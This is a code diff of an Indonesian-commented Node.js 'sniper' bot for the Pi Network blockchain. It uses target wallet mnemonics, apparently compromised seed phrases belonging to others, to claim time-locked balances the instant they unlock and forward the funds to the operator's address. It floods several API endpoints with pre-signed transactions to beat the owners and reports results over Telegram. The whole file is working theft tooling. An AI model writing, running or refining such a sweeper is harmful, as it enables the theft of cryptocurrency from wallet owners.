@@ -2,39 +2,34 @@ const StellarSdk = require('stellar-sdk');
 const ed25519 = require('ed25519-hd-key');
 const bip39 = require('bip39');
 const axios = require('axios');
-const fs = require('fs');
 require("dotenv").config();
 const { URLSearchParams } = require('url');
 
-// ================= KONFIGURASI BOT HYBRID =================
+// =================== KONFIGURASI BOT ===================
+// Semua konfigurasi sekarang dimuat dari file .env
 const CONFIG = {
-    // (DARI .env) Alamat tujuan akhir (Muxed Address OKX/lainnya)
-    RECEIVER_ADDRESS: process.env.RECEIVER_ADDRESS,
-    // (DARI .env) Mnemonic phrase dari akun SPONSOR yang akan membayar semua fee
+    // Target
+    TARGET_BALANCE_ID: process.env.TARGET_BALANCE_ID,
+    UNLOCK_TIME_ISO: process.env.UNLOCK_TIME_ISO,
+    AMOUNT_TO_CLAIM: process.env.AMOUNT_TO_CLAIM,
+    // Kunci & Alamat
     SPONSOR_MNEMONIC: process.env.SPONSOR_MNEMONIC,
-    // (DARI .env) Memo untuk transaksi
-    MEMO: process.env.MEMO || "BotHybrid",
-
-    // API Server utama untuk patroli
-    PI_API_SERVER: 'https://api.mainnet.minepi.com',
-    // Jeda antar pemeriksaan dompet di pharse.txt (dalam milidetik)
-    DELAY_PER_WALLET_MS: 10,
-    // Jeda setelah menyelesaikan satu siklus penuh pharse.txt (dalam milidetik)
-    DELAY_PER_CYCLE_MS: 60000,
-
-    // Konfigurasi khusus untuk Mode Sniper
-    SNIPER_LEAD_TIME_ADJUSTMENT_MS: -20, // Tembak 20ms lebih awal dari kalkulasi ping
-    SNIPER_REQUESTS_PER_ENDPOINT: 500,     // Jumlah serangan per endpoint
-    SNIPER_API_ENDPOINTS: [               // Endpoint yang akan diserang serentak
+    TARGET_MNEMONIC: process.env.TARGET_MNEMONIC,
+    RECEIVER_ADDRESS: process.env.RECEIVER_ADDRESS,
+    // Pengaturan Serangan
+    FEE_PER_TRANSACTION: process.env.FEE_PER_TRANSACTION || "250",
+    SNIPER_LEAD_TIME_ADJUSTMENT_MS: parseInt(process.env.SNIPER_LEAD_TIME_ADJUSTMENT_MS || "-20", 10),
+    SNIPER_REQUESTS_PER_ENDPOINT: parseInt(process.env.SNIPER_REQUESTS_PER_ENDPOINT || "15", 10),
+    MEMO: process.env.MEMO || "ManualSniper",
+    // Endpoint API Pi yang akan diserang secara simultan
+    SNIPER_API_ENDPOINTS: [
         'https://mainnet.zendshost.id',
         'https://apimainnet.vercel.app',
     ],
 };
-// ==========================================================
+// ========================================================
 
 const PI_NETWORK_PASSPHRASE = 'Pi Network';
-const server = new StellarSdk.Server(CONFIG.PI_API_SERVER);
-const scheduledSnipes = new Map(); // Untuk melacak target sniper yang sudah dijadwalkan
 
 // --- FUNGSI UTILITAS LENGKAP ---
 
@@ -49,25 +44,13 @@ async function sendTelegramNotification(message) {
     } catch (e) { console.error("Telegram error:", e.message); }
 }
 
-async function getKeypairFromMnemonic(mnemonic) {
-    if (!bip39.validateMnemonic(mnemonic)) throw new Error(`Mnemonic tidak valid: "${mnemonic.substring(0, 15)}..."`);
+async function getKeypairFromMnemonic(mnemonic, name) {
+    if (!mnemonic || !bip39.validateMnemonic(mnemonic)) {
+        throw new Error(`Mnemonic untuk "${name}" tidak valid atau tidak ditemukan di file .env.`);
+    }
     const seed = await bip39.mnemonicToSeed(mnemonic);
     const { key } = ed25519.derivePath("m/44'/314159'/0'", seed.toString('hex'));
     return StellarSdk.Keypair.fromRawEd25519Seed(key);
-}
-
-function loadTargetMnemonics() {
-    try {
-        if (!fs.existsSync('pharse.txt')) {
-             throw new Error("File pharse.txt tidak ditemukan di direktori ini.");
-        }
-        const data = fs.readFileSync('pharse.txt', 'utf8');
-        const lines = data.split(/\r?\n/).filter(line => line.trim() !== '');
-        if (lines.length === 0) throw new Error("File pharse.txt kosong.");
-        return lines;
-    } catch (e) {
-        throw new Error(`Gagal membaca pharse.txt: ${e.message}`);
-    }
 }
 
 async function checkLatency(endpoint) {
@@ -98,168 +81,62 @@ async function submitTransaction(xdr, endpoint) {
     }
 }
 
-
-// --- FUNGSI SNIPER ---
-async function executeSnipeAttack(target) {
-    const { balanceId, unlockTime, amount, targetKeypair, sponsorKeypair, avgLatency } = target;
-    console.log(`\n\n💥💥💥 MEMULAI SERANGAN SNIPER 💥💥💥`);
-    console.log(`   - Target ID: ${balanceId}`);
-    console.log(`   - Unlock Time: ${unlockTime}`);
+// --- FUNGSI UTAMA SNIPER MANUAL ---
+async function main() {
+    console.log("🚀 Bot Sniper Manual Dimulai (Mode .env)...");
+    
+    // Validasi input dari .env
+    const requiredVars = ['TARGET_BALANCE_ID', 'UNLOCK_TIME_ISO', 'AMOUNT_TO_CLAIM', 'SPONSOR_MNEMONIC', 'TARGET_MNEMONIC', 'RECEIVER_ADDRESS'];
+    for (const v of requiredVars) {
+        if (!CONFIG[v]) throw new Error(`Variabel wajib "${v}" tidak ditemukan di file .env.`);
+    }
+    if (!CONFIG.RECEIVER_ADDRESS.startsWith('M')) {
+        throw new Error("RECEIVER_ADDRESS harus berupa Muxed Address (diawali 'M').");
+    }
 
     try {
-        const sponsorAccount = await server.loadAccount(sponsorKeypair.publicKey());
+        // LANGKAH 1: PERSIAPKAN SEMUA KUNCI
+        console.log("🔑 Mempersiapkan kunci dari .env...");
+        const sponsorKeypair = await getKeypairFromMnemonic(CONFIG.SPONSOR_MNEMONIC, "Sponsor");
+        const targetKeypair = await getKeypairFromMnemonic(CONFIG.TARGET_MNEMONIC, "Target");
 
-        const transaction = new StellarSdk.TransactionBuilder(sponsorAccount, {
-            fee: (StellarSdk.BASE_FEE * 2).toString(),
-            networkPassphrase: PI_NETWORK_PASSPHRASE,
-            allowMuxedAccounts: true,
-        })
-        .addOperation(StellarSdk.Operation.claimClaimableBalance({ balanceId, source: targetKeypair.publicKey() }))
-        .addOperation(StellarSdk.Operation.payment({
-            destination: CONFIG.RECEIVER_ADDRESS,
-            asset: StellarSdk.Asset.native(),
-            amount: amount,
-            source: targetKeypair.publicKey(),
-        }))
-        .addMemo(StellarSdk.Memo.text(CONFIG.MEMO))
-        .setTimeout(30).build();
+        // LANGKAH 2: UKUR LATENSI & HITUNG WAKTU TEMBAK
+        console.log("\n📡 Mengukur latensi jaringan...");
+        const primaryEndpoint = CONFIG.SNIPER_API_ENDPOINTS[0];
+        const avgLatency = await checkLatency(primaryEndpoint);
+        if (avgLatency === Infinity) throw new Error(`Endpoint utama ${primaryEndpoint} tidak terjangkau.`);
 
-        transaction.sign(targetKeypair);
-        transaction.sign(sponsorKeypair);
-        const signedXdr = transaction.toXDR();
-        
-        const unlockTimestamp = new Date(unlockTime).getTime();
+        const unlockTimestamp = new Date(CONFIG.UNLOCK_TIME_ISO).getTime();
         const dynamicLeadTime = avgLatency + (CONFIG.SNIPER_LEAD_TIME_ADJUSTMENT_MS * -1);
         const targetTimestamp = unlockTimestamp - dynamicLeadTime;
         
-        console.log(`   - Waktu Tembak Terkalkulasi: ${new Date(targetTimestamp).toISOString()}`);
-        
-        while (Date.now() < targetTimestamp) {}
-        
-        console.log(`\n   - 🚀 TEMBAK SEKARANG!`);
-        const submissionPromises = [];
-        CONFIG.SNIPER_API_ENDPOINTS.forEach(endpoint => {
-            for (let i = 0; i < CONFIG.SNIPER_REQUESTS_PER_ENDPOINT; i++) {
-                submissionPromises.push(submitTransaction(signedXdr, endpoint));
-            }
-        });
+        console.log("\n--- STRATEGI SERANGAN ---");
+        console.log(`🎯 Target Balance ID : ${CONFIG.TARGET_BALANCE_ID}`);
+        console.log(`⏰ Waktu Buka Kunci : ${CONFIG.UNLOCK_TIME_ISO}`);
+        console.log(`💰 Jumlah Klaim      : ${CONFIG.AMOUNT_TO_CLAIM} π`);
+        console.log(`💥 Waktu Tembak (UTC): ${new Date(targetTimestamp).toISOString()}`);
+        console.log(` Fee: ${CONFIG.FEE_PER_TRANSACTION} stroops | Req/EP: ${CONFIG.SNIPER_REQUESTS_PER_ENDPOINT}`);
+        console.log("--------------------------\n");
+        await sendTelegramNotification(`🎯 <b>Sniper Manual Siap!</b>\nTarget: <code>${CONFIG.TARGET_BALANCE_ID}</code>\nJumlah: <code>${CONFIG.AMOUNT_TO_CLAIM} π</code>\nWaktu Tembak: <code>${new Date(targetTimestamp).toISOString()}</code>`);
 
-        const results = await Promise.allSettled(submissionPromises);
-        let successResult = results.find(r => r.status === 'fulfilled');
-
-        if (successResult) {
-            const successMessage = `🏆 <b>SNIPE BERHASIL!</b> 🏆\n\n` +
-                                 `<b>ID:</b> <code>${balanceId}</code>\n` +
-                                 `<b>Jumlah:</b> <code>${amount} π</code>\n` +
-                                 `<b>TX Hash:</b> <code>${successResult.value.hash}</code>\n` +
-                                 `🔗 <a href="https://blockexplorer.minepi.com/mainnet/transactions/${successResult.value.hash}">Lihat di Explorer</a>`;
-            await sendTelegramNotification(successMessage);
-        } else {
-            await sendTelegramNotification(`😭 <b>SNIPE GAGAL</b> 😭\nID: <code>${balanceId}</code>\nKemungkinan sudah diklaim orang lain.`);
-        }
-
-    } catch (error) {
-        await sendTelegramNotification(`🚨 <b>SNIPE ERROR</b>\nID: <code>${balanceId}</code>\nError: ${error.message}`);
-    } finally {
-        scheduledSnipes.delete(balanceId);
-    }
-}
-
-
-// --- FUNGSI PATROLI & PENJADWALAN ---
-async function processWallet(targetMnemonic, sponsorKeypair) {
-    let targetKeypair;
-    try {
-        targetKeypair = await getKeypairFromMnemonic(targetMnemonic);
-        const targetPublicKey = targetKeypair.publicKey();
-        console.log(`\n🔎 Memindai wallet: ${targetPublicKey.substring(0, 12)}...`);
-
-        const { data } = await axios.get(`${CONFIG.PI_API_SERVER}/claimable_balances?claimant=${targetPublicKey}&limit=50`);
-        if (data._embedded.records.length === 0) return;
-
-        for (const record of data._embedded.records) {
-            if (record.asset !== 'native') continue;
-
-            const { id: balanceId, amount } = record;
-            if (scheduledSnipes.has(balanceId)) {
-                console.log(`   - Target ${balanceId.substring(0,12)}... sudah dalam antrian sniper. Dilewati.`);
-                continue;
-            }
-
-            const now = Date.now();
-            let isClaimableNow = false;
-            let futureUnlockTime = null;
-
-            for (const claimant of record.claimants) {
-                if (claimant.destination === targetPublicKey) {
-                    const pred = claimant.predicate;
-                    if (pred.unconditional === true || (pred.abs_before && new Date(pred.abs_before).getTime() > now)) {
-                        isClaimableNow = true;
-                        break;
-                    }
-                    if (pred.not && pred.not.abs_before) {
-                        const unlockTimestamp = new Date(pred.not.abs_before).getTime();
-                        if (unlockTimestamp <= now) {
-                            isClaimableNow = true;
-                        } else {
-                            futureUnlockTime = pred.not.abs_before;
-                        }
-                        break;
-                    }
-                }
-            }
-            
-            if (isClaimableNow) {
-                console.log(`   - ✅ Ditemukan balance SIAP KLAIM: ${balanceId.substring(0,12)}...`);
-                await claimAndForwardNow(record, targetKeypair, sponsorKeypair);
-            } else if (futureUnlockTime) {
-                console.log(`   - 🎯 Ditemukan TARGET SNIPER MASA DEPAN: ${balanceId.substring(0,12)}...`);
-                console.log(`   - Waktu Buka Kunci: ${futureUnlockTime}`);
-                
-                scheduledSnipes.set(balanceId, { status: 'scheduling' });
-
-                const avgLatency = await checkLatency(CONFIG.SNIPER_API_ENDPOINTS[0]);
-                if (avgLatency === Infinity) {
-                    console.error("   - Gagal mengukur latensi. Penjadwalan sniper dibatalkan.");
-                    scheduledSnipes.delete(balanceId);
-                    continue;
-                }
-
-                const snipeTarget = {
-                    balanceId, amount, unlockTime: futureUnlockTime,
-                    targetKeypair, sponsorKeypair, avgLatency
-                };
-                
-                scheduledSnipes.set(balanceId, snipeTarget);
-                
-                const timeToWait = new Date(futureUnlockTime).getTime() - Date.now() - (avgLatency + 30000); // Mulai persiapan 30s sebelum tembak
-
-                setTimeout(() => executeSnipeAttack(snipeTarget), timeToWait > 0 ? timeToWait : 0);
-
-                await sendTelegramNotification(`🎯 <b>SNIPER DIJADWALKAN</b>\n` +
-                                             `<b>ID:</b> <code>${balanceId}</code>\n` +
-                                             `<b>Waktu:</b> <code>${futureUnlockTime}</code>`);
-            }
-        }
-    } catch (error) {
-        console.error(`   - ❌ GAGAL memproses wallet:`, error.response?.data?.detail || error.message);
-    }
-}
-
-async function claimAndForwardNow(record, targetKeypair, sponsorKeypair) {
-    console.log(`      - Mengeksekusi klaim & forward sekarang...`);
-    try {
+        // LANGKAH 3: PRE-BUILD & PRE-SIGN TRANSAKSI
+        console.log("🛠️ Membangun dan menandatangani transaksi...");
+        const server = new StellarSdk.Server(primaryEndpoint);
         const sponsorAccount = await server.loadAccount(sponsorKeypair.publicKey());
+        
         const transaction = new StellarSdk.TransactionBuilder(sponsorAccount, {
-            fee: (StellarSdk.BASE_FEE * 2).toString(),
+            fee: CONFIG.FEE_PER_TRANSACTION,
             networkPassphrase: PI_NETWORK_PASSPHRASE,
             allowMuxedAccounts: true,
         })
-        .addOperation(StellarSdk.Operation.claimClaimableBalance({ balanceId: record.id, source: targetKeypair.publicKey() }))
+        .addOperation(StellarSdk.Operation.claimClaimableBalance({
+            balanceId: CONFIG.TARGET_BALANCE_ID,
+            source: targetKeypair.publicKey(),
+        }))
         .addOperation(StellarSdk.Operation.payment({
             destination: CONFIG.RECEIVER_ADDRESS,
             asset: StellarSdk.Asset.native(),
-            amount: record.amount,
+            amount: CONFIG.AMOUNT_TO_CLAIM,
             source: targetKeypair.publicKey(),
         }))
         .addMemo(StellarSdk.Memo.text(CONFIG.MEMO))
@@ -267,53 +144,46 @@ async function claimAndForwardNow(record, targetKeypair, sponsorKeypair) {
 
         transaction.sign(targetKeypair);
         transaction.sign(sponsorKeypair);
+        const signedXdr = transaction.toXDR();
+        console.log("✅ Transaksi siap. Menunggu waktu tembak...");
 
-        const txResult = await server.submitTransaction(transaction);
-        const successMsg = `🏆 <b>PATROLI SUKSES!</b> 🏆\n\n` +
-                         `<b>Dari:</b> <code>${targetKeypair.publicKey()}</code>\n` +
-                         `<b>Jumlah:</b> <code>${record.amount} π</code>\n` +
-                         `<b>TX Hash:</b> <code>${txResult.hash}</code>`;
-        console.log(`      - ✅ SUKSES! Hash: ${txResult.hash}`);
-        await sendTelegramNotification(successMsg);
-    } catch(error) {
-        const errorMessage = error.response?.data?.extras?.result_codes?.transaction || error.message;
-        console.error(`      - ❌ GAGAL! Alasan: ${errorMessage}`);
-        await sendTelegramNotification(`❌ <b>GAGAL KLAIM PATROLI</b>\nID: <code>${record.id}</code>\nAlasan: ${errorMessage}`);
-    }
-}
-
-// --- FUNGSI UTAMA BOT ---
-async function main() {
-    console.log("🚀 Bot Hybrid (Patroli & Sniper) Dimulai...");
-    await sendTelegramNotification("🚀 <b>Bot Hybrid (Patroli & Sniper) Dimulai</b>");
-
-    // Validasi & Setup
-    if (!CONFIG.RECEIVER_ADDRESS || !CONFIG.RECEIVER_ADDRESS.startsWith('M')) throw new Error("RECEIVER_ADDRESS di .env tidak valid atau bukan Muxed Address.");
-    if (!CONFIG.SPONSOR_MNEMONIC) throw new Error("SPONSOR_MNEMONIC tidak ditemukan di .env.");
-    
-    const targetMnemonics = loadTargetMnemonics();
-    const sponsorKeypair = await getKeypairFromMnemonic(CONFIG.SPONSOR_MNEMONIC);
-    
-    console.log(`\nSponsor Fee Payer: ${sponsorKeypair.publicKey()}`);
-    console.log(`Tujuan Akhir: ${CONFIG.RECEIVER_ADDRESS}`);
-    console.log(`Ditemukan ${targetMnemonics.length} dompet target untuk dipatroli.`);
-    
-    // Loop Patroli Tak Terbatas
-    while (true) {
-        console.log("\n--- Memulai Siklus Patroli Baru ---");
-        for (const [index, mnemonic] of targetMnemonics.entries()) {
-            await processWallet(mnemonic, sponsorKeypair);
-            if(index < targetMnemonics.length - 1) {
-                await new Promise(resolve => setTimeout(resolve, CONFIG.DELAY_PER_WALLET_MS));
-            }
+        // LANGKAH 4: HITUNG MUNDUR & LOOP TUNGGU-SIBUK
+        while (Date.now() < targetTimestamp - 10000) {
+            console.log(`   ⏳ Menunggu... Sisa waktu: ${Math.round((targetTimestamp - Date.now()) / 1000)}s`);
+            await new Promise(resolve => setTimeout(resolve, 5000));
         }
-        console.log(`\n--- Siklus Patroli Selesai. Menunggu ${CONFIG.DELAY_PER_CYCLE_MS / 1} 1 ms... ---`);
-        await new Promise(resolve => setTimeout(resolve, CONFIG.DELAY_PER_CYCLE_MS));
+        while (Date.now() < targetTimestamp - 100) {
+            process.stdout.write(`   🔥 Countdown: ${(targetTimestamp - Date.now()).toString().padStart(4, ' ')}ms   \r`);
+        }
+        while (Date.now() < targetTimestamp) { /* Busy-wait loop */ }
+
+        // LANGKAH 5: SERANGAN SATURASI!
+        console.log("\n\n💥💥💥 TEMBAK! TEMBAK! TEMBAK! 💥💥💥");
+        const totalRequests = CONFIG.SNIPER_API_ENDPOINTS.length * CONFIG.SNIPER_REQUESTS_PER_ENDPOINT;
+        console.log(`   -> Mengirim ${totalRequests} permintaan secara serentak...`);
+        const submissionPromises = [];
+        CONFIG.SNIPER_API_ENDPOINTS.forEach(endpoint => {
+            for (let i = 0; i < CONFIG.SNIPER_REQUESTS_PER_ENDPOINT; i++) {
+                submissionPromises.push(submitTransaction(signedXdr, endpoint));
+            }
+        });
+
+        // LANGKAH 6: PROSES HASIL
+        const results = await Promise.allSettled(submissionPromises);
+        let successResult = results.find(r => r.status === 'fulfilled');
+
+        if (successResult) {
+            const successMessage = `🏆 <b>SNIPE BERHASIL!</b> 🏆\n\n<b>Hash:</b> <code>${successResult.value.hash}</code>\n🔗 <a href="https://blockexplorer.minepi.com/mainnet/transactions/${successResult.value.hash}">Lihat di Explorer</a>`;
+            await sendTelegramNotification(successMessage);
+        } else {
+            await sendTelegramNotification(`😭 <b>SNIPE GAGAL</b> 😭\nSemua ${totalRequests} permintaan gagal. Kemungkinan kalah cepat.`);
+        }
+
+    } catch (error) {
+        console.error("\n🚨 KESALAHAN FATAL:", error.message);
+        await sendTelegramNotification(`🚨 <b>BOT ERROR</b>: ${error.message}`);
+        process.exit(1);
     }
 }
 
-main().catch(error => {
-    console.error("\n🚨 KESALAHAN FATAL PADA BOT:", error.message);
-    sendTelegramNotification(`🚨 <b>BOT BERHENTI - KESALAHAN FATAL</b>\n\n${error.message}`);
-    process.exit(1);
-});
+main();
